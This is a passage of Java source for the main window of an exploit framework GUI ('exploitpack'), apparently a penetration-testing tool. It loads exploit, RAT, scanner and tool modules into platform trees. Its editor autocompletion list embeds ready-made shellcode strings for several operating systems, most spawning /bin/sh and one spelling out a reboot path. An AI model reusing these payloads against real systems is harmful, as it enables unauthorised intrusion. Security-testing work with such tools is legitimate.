package exploitpack;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.awt.Color;
import java.awt.Desktop;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.Timestamp;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;
import javax.swing.ImageIcon;
import javax.swing.JFileChooser;
import static javax.swing.JFrame.EXIT_ON_CLOSE;
import javax.swing.JOptionPane;
import javax.swing.text.DefaultEditorKit;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeCellRenderer;
import javax.swing.tree.DefaultTreeModel;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.fife.ui.autocomplete.AutoCompletion;
import org.fife.ui.autocomplete.BasicCompletion;
import org.fife.ui.autocomplete.CompletionProvider;
import org.fife.ui.autocomplete.DefaultCompletionProvider;
import org.fife.ui.autocomplete.ShorthandCompletion;
import org.fife.ui.rsyntaxtextarea.RSyntaxTextArea;
import org.fife.ui.rsyntaxtextarea.SyntaxConstants;
import org.fife.ui.rtextarea.RTextScrollPane;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

/**
 *
 * @author jsacco
 */
public class MainFrame extends javax.swing.JFrame {

    private String LogTime;
    private int TotalModulesLength;
    XMLTreenode NewXMLNode = new XMLTreenode();
    Exploit exploit = new Exploit();
    private Object LastTreeItemSelected;
    public String runModule = null;
    private String ShellcodeSelected = null;
    public String multiServerip;
    public String multiServerport;
    RSyntaxTextArea jTextAreaModuleEditor = new RSyntaxTextArea(20, 60);
    RSyntaxTextArea jTextAreaTargets = new RSyntaxTextArea(20, 60);

    static XSSObject xssAgent = new XSSObject();

    // Configuration
    public String nmappath;
    public String pythonpath;
    public String ScannerOptions = "";
    public String serverPort = "";
    public String userName = "";
    public String userEmail = "";
    public String userWeb = "";
    List<String> config = new ArrayList<>();
    StringBuilder pentestNote = new StringBuilder();

    /**
     * Create a simple provider that adds some Java-related completions.
     */
    private CompletionProvider createCompletionProvider() {

        // A DefaultCompletionProvider is the simplest concrete implementation
        // of CompletionProvider. This provider has no understanding of
        // language semantics. It simply checks the text entered up to the
        // caret position for a match against known completions. This is all
        // that is needed in the majority of cases.
        DefaultCompletionProvider provider = new DefaultCompletionProvider();

        // Add completions for all Java keywords. A BasicCompletion is just
        // a straightforward word completion.
        provider.addCompletion(new BasicCompletion(provider, "abstract"));
        provider.addCompletion(new BasicCompletion(provider, "assert"));
        provider.addCompletion(new BasicCompletion(provider, "break"));
        provider.addCompletion(new BasicCompletion(provider, "case"));
        provider.addCompletion(new BasicCompletion(provider, "transient"));
        provider.addCompletion(new BasicCompletion(provider, "try"));
        provider.addCompletion(new BasicCompletion(provider, "while() { }"));
        provider.addCompletion(new BasicCompletion(provider, "for(i in x) do{} done"));
        provider.addCompletion(new BasicCompletion(provider, "if { } else { }"));
        provider.addCompletion(new BasicCompletion(provider, "payload"));
        provider.addCompletion(new BasicCompletion(provider, "junk"));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeOSX32 = \"\"\"\\x48\\x31\\xff\\x40\\xb7\\x02\\x48\\x31\\xf6\\x40\\xb6\\x01\\x48\\x31\\xd2\\x48\" \\\n"
                + "\"\\x31\\xc0\\xb0\\x02\\x48\\xc1\\xc8\\x28\\xb0\\x61\\x49\\x89\\xc4\\x0f\\x05\\x49\" \\\n"
                + "\"\\x89\\xc1\\x48\\x89\\xc7\\x48\\x31\\xf6\\x56\\xbe\\x01\\x02\\x11\\x5c\\x83\\xee\" \\\n"
                + "\"\\x01\\x56\\x48\\x89\\xe6\\xb2\\x10\\x41\\x80\\xc4\\x07\\x4c\\x89\\xe0\\x0f\\x05\" \\\n"
                + "\"\\x48\\x31\\xf6\\x48\\xff\\xc6\\x41\\x80\\xc4\\x02\\x4c\\x89\\xe0\\x0f\\x05\\x48\" \\\n"
                + "\"\\x31\\xf6\\x41\\x80\\xec\\x4c\\x4c\\x89\\xe0\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\" \\\n"
                + "\"\\xf6\\x41\\x80\\xc4\\x3c\\x4c\\x89\\xe0\\x0f\\x05\\x48\\xff\\xc6\\x4c\\x89\\xe0\" \\\n"
                + "\"\\x0f\\x05\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" \\\n"
                + "\"\\x57\\x48\\x89\\xe7\\x48\\x31\\xd2\\x41\\x80\\xec\\x1f\\x4c\\x89\\xe0\\x0f\\x05\";"));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeOSX64 = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\x48\\x31\\xd2\\x48\\x31\\xc0\\xb0\\x02\\x48\\xc1\\xc8\\x28\\xb0\\x3b\\x0f\\x05\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeWin32 = \"\\x31\\xc0\\x50\\x68\\x42\\x34\\x6d\\x7c\\x68\\x7c\\x42\\x33\\x6d\\x89\\xe1\\xbb\\xd4\\x29\\x86\\x7c\\x51\\x50\\xff\\xd3\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeWin64 =  \"\\x64\\xA1\\x30\\x00\\x00\\x00\\x8B\\x40\\x02\\xBB\\x00\\x80\\xFF\\x7F\\x81\\xC3\\x00\\x80\\xFF\\x7F\\x43\\x68\\x00\\x03\\x00\\x00\\x68\\x00\\x02\\x00\\x00\\xBA\\x8F\\x7A\\x83\\x7C\\x3B\\xC3\\x75\\x02\\xFF\\xD2\\x6A\\x00\\xE8\\x01\\x00\\x00\\x00\\xCC\\xFF\\x25\\x00\\x20\\x40\\x00\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeLinux64 = \"\\48\\31\\c0\\48\\83\\c0\\3b\\48\\31\\ff\\57\\48\\bf\\2f\\62\\69\\6e\\2f\\2f\\73\\68\\57\\48\\8d\\3c\\24\\48\\31\\f6\\48\\31\\d2\\0f\\05\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeLinux32 = \"\\xb0\\x46\\x31\\xc0\\xcd\\x80\\xeb\\x07\\x5b\\x31\\xc0\\xb0\\x0b\\xcd\\x80\\x31\\xc9\\xe8\\xf2\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68"));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeSolaris = \"\\x31\\xc0\\x50\\x68\\x62\\x6f\\x6f\\x74\\x68\\x6e\"\n"
                + "            \"\\x2f\\x72\\x65\\x68\\x2f\\x73\\x62\\x69\\x68\\x2f\"\n"
                + "            \"\\x75\\x73\\x72\\x89\\xe3\\x50\\x53\\x89\\xe1\\x50\"\n"
                + "            \"\\x51\\x53\\xb0\\x0b\\x50\\xcd\\x91\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeSolarisx86 = \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x91\\x50\\x68\"\n"
                + "		\"\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\"\n"
                + "		\"\\xe3\\x50\\x53\\x89\\xe2\\x50\\x52\\x53\\xb0\\x3b\"\n"
                + "		\"\\x50\\xcd\\x91\\x40\\x50\\x50\\xcd\\x91\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeFreeBSD = \"\"\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x04\\x3b\\x48\\xbb\"\n"
                + "\"\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x52\\x53\"\n"
                + "\"\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\"\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeHPUX = \"\\xe8\\x3f\\x1f\\xfd\\x08\\x21\\x02\\x80\\x34\\x02\\x01\\x02\\x08\\x41\\x04\\x02\\x60\\x40\"\n"
                + "  \"\\x01\\x62\\xb4\\x5a\\x01\\x54\\x0b\\x39\\x02\\x99\\x0b\\x18\\x02\\x98\\x34\\x16\\x04\\xbe\"\n"
                + "  \"\\x20\\x20\\x08\\x01\\xe4\\x20\\xe0\\x08\\x96\\xd6\\x05\\x34\\xde\\xad\\xca\\xfe/bin/sh\\xff\""));
        provider.addCompletion(new BasicCompletion(provider, "shellcodeOpenBSD = \"\\x31\\xc0\\x66\\xba\\x0e\\x27\\x66\\x81\\xea\\x06\\x27\\xb0\\x37\\xcd\\x80\""));

        // Add a couple of "shorthand" completions. These completions don't
        // require the input text to be the same thing as the replacement text.
        provider.addCompletion(new ShorthandCompletion(provider, "sysout",
                "System.out.println(", "System.out.println("));
        provider.addCompletion(new ShorthandCompletion(provider, "syserr",
                "System.err.println(", "System.err.println("));

        return provider;
    }

    /**
     * Creates new form MainFrame
     */
    public MainFrame() {
        FileReader streamCheck = null;
        try {
            initComponents();
            // Initialize the editor
            int lebar = this.getWidth() / 2;
            int tinggi = this.getHeight() / 2;
            int x = (Toolkit.getDefaultToolkit().getScreenSize().width / 2) - lebar;
            int y = (Toolkit.getDefaultToolkit().getScreenSize().height / 2) - tinggi;
            this.setLocation(x, y);
            this.setVisible(true);
            setDefaultCloseOperation(Notepad.DISPOSE_ON_CLOSE);
            getContentPane().setBackground(Color.WHITE);
            setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/bug.png")));
            jTextAreaModuleEditor.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_PYTHON);
            jTextAreaModuleEditor.setCodeFoldingEnabled(true);
            jTextAreaTargets.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_PYTHON);
            jTextAreaTargets.setCodeFoldingEnabled(true);
            jPanelTargets.add(new RTextScrollPane(jTextAreaTargets));
            jPanelEditor.add(new RTextScrollPane(jTextAreaModuleEditor));

            // A CompletionProvider is what knows of all possible completions, and
            // analyzes the contents of the text area at the caret position to
            // determine what completion choices should be presented. Most instances
            // of CompletionProvider (such as DefaultCompletionProvider) are designed
            // so that they can be shared among multiple text components.
            CompletionProvider provider = createCompletionProvider();

            // An AutoCompletion acts as a "middle-man" between a text component
            // and a CompletionProvider. It manages any options associated with
            // the auto-completion (the popup trigger key, whether to display a
            // documentation window along with completion choices, etc.). Unlike
            // CompletionProviders, instances of AutoCompletion cannot be shared
            // among multiple text components.
            AutoCompletion ac = new AutoCompletion(provider);
            ac.install(jTextAreaModuleEditor);
            setDefaultCloseOperation(EXIT_ON_CLOSE);
            pack();
            setLocationRelativeTo(null);
            // Read config file
            List<String> helper = new ArrayList<>();
            streamCheck = new FileReader("output/" + "helper" + ".ep");
            BufferedReader inCheck = new BufferedReader(streamCheck);
            String stringtocheck;
            while ((stringtocheck = inCheck.readLine()) != null) {
                helper.add(stringtocheck);
            }
            streamCheck.close();

            setLocationRelativeTo(null);
            setDefaultCloseOperation(InitialCheck.DISPOSE_ON_CLOSE);
            getContentPane().setBackground(Color.WHITE);
            setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/bug.png")));

            // Read config file
            FileReader fstream = new FileReader("output/" + "config" + ".ep");
            BufferedReader in = new BufferedReader(fstream);
            String stringToAppend;
            while ((stringToAppend = in.readLine()) != null) {
                config.add(stringToAppend);
            }
            pythonpath = config.get(0);
            nmappath = config.get(1);
            ScannerOptions = config.get(2);
            serverPort = config.get(3);
            userName = config.get(4);
            userEmail = config.get(5);
            userWeb = config.get(6);

            // Set config
            jTextAreaShellcode.setCaretPosition(0);
            jLabelWelcome.setText("User logged in: " + userName + " - [ Triforce v7.5 ]");
            // Obtain local time
            Format formatter;
            Date date = new Date();
            formatter = new SimpleDateFormat("hh:mm:ss");
            LogTime = formatter.format(date);

            // EPLog
            EPLogger.log("System started: " + LogTime);
            EPLogger.log("IP Address: " + Inet4Address.getLocalHost().getHostAddress());

            // Read log file
            FileReader fstreamConfig = new FileReader("output/" + "executionlog" + ".eplog");
            BufferedReader inConfig = new BufferedReader(fstreamConfig);
            String lineConfig;
            while ((lineConfig = inConfig.readLine()) != null) {
                jTextAreaAppLog.append(lineConfig + "\n");
            }
            // Close the output stream
            in.close();
            jTextAreaAppLog.setCaretPosition(0);
            try {
                jLabelInterface.setText(Exploit.getIpExternal());
            } catch (Exception e) {
                System.out.println("Sorry couldn't get the external IP address");
            }

            // Generate tree
            String path = "exploits/";
            String files;
            File folder = new File(path);
            File[] listOfFiles = folder.listFiles();
            jTextAreaQuickInfo.append("[" + LogTime + "] "
                    + "Modules successfully loaded: OK" + "\n");

            DefaultTreeCellRenderer rendererModules = new DefaultTreeCellRenderer();
            rendererModules.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/application.png"))));
            rendererModules.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/application.png"))));
            rendererModules.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/log.png"))));
            jTreeModuleStatus.setCellRenderer(rendererModules);

            DefaultTreeCellRenderer rendererExploits = new DefaultTreeCellRenderer();
            rendererExploits.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
            rendererExploits.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
            rendererExploits.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/scriptnormal.png"))));
            jTreeExploits.setCellRenderer(rendererExploits);

            DefaultTreeCellRenderer rendererRAT = new DefaultTreeCellRenderer();
            rendererRAT.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/world.png"))));
            rendererRAT.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/world.png"))));
            rendererRAT.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/terminal.png"))));
            jTreeRAT.setCellRenderer(rendererRAT);

            DefaultTreeCellRenderer rendererScanner = new DefaultTreeCellRenderer();
            rendererScanner.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/networking.png"))));
            rendererScanner.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/networking.png"))));
            rendererScanner.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/port.png"))));
            jTreeRemoteScanner.setCellRenderer(rendererScanner);

            DefaultTreeCellRenderer rendererTools = new DefaultTreeCellRenderer();
            rendererTools.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
            rendererTools.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
            rendererTools.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/tool.png"))));
            jTreeTools.setCellRenderer(rendererTools);

            DefaultTreeCellRenderer rendererNotepad = new DefaultTreeCellRenderer();
            rendererNotepad.setClosedIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal.png"))));
            rendererNotepad.setOpenIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/foldernormal2.png"))));
            rendererNotepad.setLeafIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/server2.png"))));
            jTreeNotepad.setCellRenderer(rendererNotepad);

            // Iterate and add items
            DefaultTreeModel model = (DefaultTreeModel) jTreeExploits.getModel();
            DefaultTreeModel modelNotepad = (DefaultTreeModel) jTreeNotepad.getModel();
            DefaultTreeModel modelTools = (DefaultTreeModel) jTreeTools.getModel();
            jTreeExploits.removeAll();
            jTreeNotepad.removeAll();
            jTreeTools.removeAll();
            for (int i = 0; i < listOfFiles.length; i++) {
                if (listOfFiles[i].isFile()) {
                    files = listOfFiles[i].getName();
                    if (files.endsWith(".xml") || files.endsWith(".XML")) {
                        // Instancio XMLTreenode
                        NewXMLNode = new XMLTreenode();
                        // Start de la clase main de XMLTreenode
                        NewXMLNode.main(null, files);

                        // Targets Tree
                        if (NewXMLNode.ExploitType.equals("notepad")) {
                            DefaultMutableTreeNode item = null;
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelNotepad.getChild(modelNotepad.getRoot(), 0);
                            if (NewXMLNode.Platform.equals("windows")) {
                                if (NewXMLNode.SpecialArgs.equals("owned")) {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                } else {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                }
                            }
                            if (NewXMLNode.Platform.equals("linux")) {
                                if (NewXMLNode.SpecialArgs.equals("owned")) {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                } else {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                }
                            }
                            if (NewXMLNode.Platform.equals("osx")) {
                                if (NewXMLNode.SpecialArgs.equals("owned")) {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                } else {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                }
                            }
                            if (NewXMLNode.Platform.equals("bsd")) {
                                if (NewXMLNode.SpecialArgs.equals("owned")) {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                } else {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                }
                            }
                            if (NewXMLNode.Platform.equals("mobile")) {
                                if (NewXMLNode.SpecialArgs.equals("owned")) {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                } else {
                                    item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                                }
                            }
                            root.add(item);
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelNotepad.getChild(modelNotepad.getRoot(), 0);
                            if (root.getChildCount() == 0) {
                                //root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("tools")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 0);
                            DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            root.add(item);
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 0);
                            if (root.getChildCount() == 0) {
                                //root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("dos")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 1);
                            DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            root.add(item);
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 1);
                            if (root.getChildCount() == 0) {
                                //root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("others")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 2);
                            DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            root.add(item);
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) modelTools.getChild(modelTools.getRoot(), 2);
                            if (root.getChildCount() == 0) {
                                //root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }

                        // Exploit Tree
                        if (NewXMLNode.Platform.equals("aix")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 1);
                            DefaultMutableTreeNode item = new DefaultMutableTreeNode(NewXMLNode.ExploitName);
                            root.add(item);
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 1);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("android")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 2);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 2);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("arm")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 3);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 3);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("asp")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 4);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 4);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("atheos")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 5);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 5);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("beos")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 6);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 6);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("bsd")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 7);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 7);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("bsd_ppc")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 8);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 8);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("bsd_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 9);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 9);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("bsdi_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 10);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 10);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("cfm")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 11);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 11);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("cgi")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 12);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 12);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("freebsd")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 13);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 13);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("freebsd_x86")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 14);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 14);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("freebsd_x86-64")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 15);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 15);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("generator")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 16);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 16);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("hardware")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 17);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 17);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("hp-ux")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 18);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 18);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("immunix")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 19);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
                        } else {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 19);
                            if (root.getChildCount() == 0) {
                                root.add(new DefaultMutableTreeNode("Empty"));
                            }
                        }
                        if (NewXMLNode.Platform.equals("ios")) {
                            DefaultMutableTreeNode root = (DefaultMutableTreeNode) model.getChild(model.getRoot(), 20);
                            root.add(new DefaultMutableTreeNode(NewXMLNode.ExploitName));
                            model.reload(root);
